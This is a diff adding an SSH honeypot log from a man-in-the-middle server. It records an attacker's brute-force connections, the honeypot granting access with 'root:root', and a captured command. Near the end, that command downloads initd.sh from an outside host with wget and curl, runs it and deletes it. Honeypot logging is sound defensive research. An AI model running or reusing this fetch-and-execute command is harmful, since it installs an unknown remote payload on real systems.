@@ -1,0 +1,63 @@
+2020-11-12 15:42:50.806 - [Info] MITM Version: 1.26
+2020-11-12 15:42:50.811 - [Info] Auto Access Enabled: true
+2020-11-12 15:42:50.812 - [Debug] [Init] Auto Access Barrier: true
+2020-11-12 15:42:50.832 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-12 16:06:33.482 - [Debug] [Connection] Attacker connected: 167.248.133.38 | Client Identification: SSH-2.0-Go
+2020-11-12 16:06:48.480 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:17:46.448 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.449 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.449 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.451 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.451 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.452 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:46.454 - [Debug] [Connection] Attacker connected: 205.185.115.183 | Client Identification: SSH-2.0-Go
+2020-11-12 16:17:53.427 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.428 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.429 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.429 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.430 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.430 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.431 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:17:53.432 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "none"
+2020-11-12 16:17:53.432 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-12 16:18:05.865 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.866 - [Debug] [Auto Access] Attacker: 205.185.115.183, Threshold: 1, Attempts: 1
+2020-11-12 16:18:05.866 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-12 16:18:05.866 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2020-11-12 16:18:05.991 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-12 16:18:05.991 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-12 16:18:05.994 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.995 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.995 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:05.995 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.995 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.996 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:05.996 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.996 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.996 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:05.997 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.997 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.997 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:05.997 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.998 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.998 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:05.998 - [Debug] [Auth] Attacker 205.185.115.183 trying to authenticate with "password"
+2020-11-12 16:18:05.998 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-12 16:18:05.999 - [Debug] [Auth] Attacker: 205.185.115.183 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-12 16:18:07.985 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-12 16:18:10.722 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:10.722 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:10.722 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:10.723 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:10.723 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:10.723 - [Debug] [Connection] Attacker closed the connection
+2020-11-12 16:18:14.517 - [Debug] [EXEC] Noninteractive mode attacker command: wget http://theprivatevalley.webredirect.org:8281/initd.sh -O /var/tmp/initd.sh; curl http://theprivatevalley.webredirect.org:8281/initd.sh -o /var/tmp/initd.sh; sh /var/tmp/initd.sh; rm -rf /var/tmp/initd.sh; rm -rf /var/tmp/initd.sh.1; rm -rf /var/tmp/initd.sh.2
+2020-11-12 16:23:09.252 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-12 16:23:09.252 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-12 16:23:09.298 - [Info] Exiting...
+2020-11-12 16:23:09.299 - [Debug] Cleaning up...
